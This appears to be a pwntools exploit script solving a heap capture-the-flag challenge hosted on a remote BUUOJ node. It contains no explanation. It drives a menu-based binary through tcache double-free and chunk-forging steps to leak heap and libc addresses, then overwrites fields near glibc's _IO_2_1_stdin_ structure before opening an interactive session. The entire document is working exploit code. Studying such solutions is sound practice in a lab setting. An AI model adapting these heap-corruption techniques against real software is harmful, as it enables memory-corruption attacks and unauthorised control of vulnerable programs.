from pwn import *
#p=process('./1')
#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
#libc=ELF('/glibc/2.27/64/lib/libc-2.27.so')
p=remote('node3.buuoj.cn',27690)
libc=ELF('libc-2.27_64.so')
context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
#context.log_level='debug'
def debug():
    gdb.attach(p)
    pause()
def add(add_type, add_num):
    p.sendlineafter('which command?\n> ', '1')
    p.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(add_type))
    p.sendafter('your inode number:', str(add_num))
def remove(remove_type):
    p.sendlineafter('which command?\n> ', '2')
    p.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(remove_type))
def show(show_type):
    p.sendlineafter('which command?\n> ', '3')
    p.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(show_type))
    if show_type == 1:
        p.recvuntil('your int type inode number :')
    elif show_type == 2:
        p.recvuntil('your short type inode number :')
    return int(p.recvuntil('\n', drop=True))
 
add(1,0x30)
remove(1)
add(2,0x20)
add(2,0x20)
add(2,0x20)
add(2,0x20)
remove(2)
add(1,0x30)
remove(2)
addr_chunk0_prev_size=show(2)-0xa0
add(2,addr_chunk0_prev_size)
add(2,addr_chunk0_prev_size)
add(2,0x91)
for i in range(0,7):
    remove(1)
    add(2,0x20)
remove(1)
libc.address=show(1)-96-libc.sym['__malloc_hook']-0x10
print hex(libc.address)
print hex(libc.sym['_IO_2_1_stdin_'])
add(1,libc.sym['_IO_2_1_stdin_']+0x70)
add(1,0x30)
remove(1)
add(2,0x20)
remove(1)
addr=show(1)-0x30
add(1,addr)
add(1,addr)
add(1,111)
add(1,666)
p.interactive()
